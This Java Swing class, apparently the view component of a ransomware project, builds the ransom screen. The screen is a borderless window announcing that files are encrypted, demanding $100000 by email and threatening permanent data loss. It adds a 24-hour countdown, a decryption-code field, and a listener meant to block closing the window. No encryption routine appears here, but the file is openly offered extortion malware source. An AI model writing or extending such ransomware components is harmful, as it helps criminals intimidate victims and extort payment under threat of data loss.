package View;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionListener;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.util.Timer;
import java.util.TimerTask;

public class VirusView {
    private JFrame frame;
    private JTextField keyField;
    private JButton decryptButton;
    private JLabel messageLabel;
    private JLabel timerLabel;
    private JPanel panel;

    public VirusView() {
        frame = new JFrame("Important Security Alert");
        frame.setSize(600, 300); // Increased size for more impact

        // Set undecorated to remove window decorations
        frame.setUndecorated(true);
        frame.getRootPane().setWindowDecorationStyle(JRootPane.NONE);

        panel = new JPanel();
        panel.setLayout(new BorderLayout());
        frame.add(panel);

        // Add a header to the panel
        JLabel headerLabel = new JLabel("!!! WARNING !!!", JLabel.CENTER);
        headerLabel.setFont(new Font("Arial", Font.BOLD, 24));
        headerLabel.setForeground(Color.RED);
        panel.add(headerLabel, BorderLayout.NORTH);

        // Add message area
        messageLabel = new JLabel("<html>Your files have been encrypted!<br/>" +
                "To regain access, you must pay $100000 to the following email:<br/>" +
                "<b>payment@example.com</b><br/>" +
                "Enter the decryption code below to unlock your files.<br/>" +
                "Failure to comply will result in permanent data loss.</html>", JLabel.CENTER);
        messageLabel.setFont(new Font("Arial", Font.PLAIN, 16));
        messageLabel.setForeground(Color.BLACK);
        panel.add(messageLabel, BorderLayout.CENTER);

        // Add a panel for input and button
        JPanel inputPanel = new JPanel();
        inputPanel.setLayout(new GridBagLayout());
        GridBagConstraints gbc = new GridBagConstraints();
        gbc.insets = new Insets(10, 10, 10, 10);
        gbc.gridx = 0;
        gbc.gridy = 0;
        gbc.anchor = GridBagConstraints.CENTER;

        JLabel keyLabel = new JLabel("Enter Decryption Code:");
        keyLabel.setFont(new Font("Arial", Font.BOLD, 14));
        keyLabel.setForeground(Color.BLACK);
        inputPanel.add(keyLabel, gbc);

        gbc.gridy = 1;
        keyField = new JTextField(20);
        inputPanel.add(keyField, gbc);

        gbc.gridy = 2;
        decryptButton = new JButton("Decrypt");
        decryptButton.setFont(new Font("Arial", Font.BOLD, 14));
        decryptButton.setForeground(Color.WHITE);
        decryptButton.setBackground(Color.RED);
        inputPanel.add(decryptButton, gbc);

        panel.add(inputPanel, BorderLayout.SOUTH);

        // Add timer label
        timerLabel = new JLabel("Time left: 24:00:00", JLabel.CENTER);
        timerLabel.setFont(new Font("Arial", Font.BOLD, 18));
        timerLabel.setForeground(Color.RED);
        panel.add(timerLabel, BorderLayout.NORTH);

        // Add border around the panel
        panel.setBorder(BorderFactory.createLineBorder(Color.BLACK, 2));

        // Center the frame on the screen
        frame.setLocationRelativeTo(null);
        frame.setVisible(true);

        // Start the 24-hour countdown timer
        startCountdownTimer();

        // Add a window listener to prevent closing
        frame.addWindowListener(new WindowAdapter() {
            @Override
            public void windowClosing(WindowEvent e) {
                // Do nothing on close attempt
            }
        });
    }

    private void startCountdownTimer() {
        Timer timer = new Timer();
        TimerTask task = new TimerTask() {
            private long remainingTime = 24 * 60 * 60 * 1000; // 24 hours in milliseconds

            @Override
            public void run() {
                if (remainingTime <= 0) {
                    timer.cancel();
                    return;
                }
                remainingTime -= 1000;
                long hours = (remainingTime / (60 * 60 * 1000)) % 24;
                long minutes = (remainingTime / (60 * 1000)) % 60;
                long seconds = (remainingTime / 1000) % 60;
                timerLabel.setText(String.format("Time left: %02d:%02d:%02d", hours, minutes, seconds));
            }
        };
        timer.scheduleAtFixedRate(task, 0, 1000);
    }

    public String getDecryptionCode() {
        return keyField.getText();
    }

    public void addDecryptListener(ActionListener listenForDecryptButton) {
        decryptButton.addActionListener(listenForDecryptButton);
    }

    public void showMessage(String message, String title, int messageType) {
        JOptionPane.showMessageDialog(frame, message, title, messageType);
    }
}
